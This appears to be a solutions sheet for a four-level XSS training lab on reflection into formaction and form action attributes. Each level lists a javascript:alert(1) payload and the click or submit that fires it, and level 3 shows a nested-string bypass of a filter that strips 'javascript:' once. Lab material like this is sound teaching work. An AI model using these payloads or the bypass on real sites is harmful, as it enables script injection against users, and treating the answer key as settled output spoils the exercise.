# formaction — solutions

Reflection in `formaction` / `action` URL attributes — `javascript:` URI works in form submission context.

### formaction-level1

`/formaction/level1/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<button formaction='...'>`; click the button to fire

### formaction-level2

`/formaction/level2/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<input type='image' formaction='...'>`; click image to fire

### formaction-level3

`/formaction/level3/?query=javajavascript:script:alert(1)`

- payload: `javajavascript:script:alert(1)`
- context: lowercase `javascript:` removed once; nest to reassemble (fires on submit)

### formaction-level4

`/formaction/level4/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<form action='...'>`; submit form to fire the JS URI
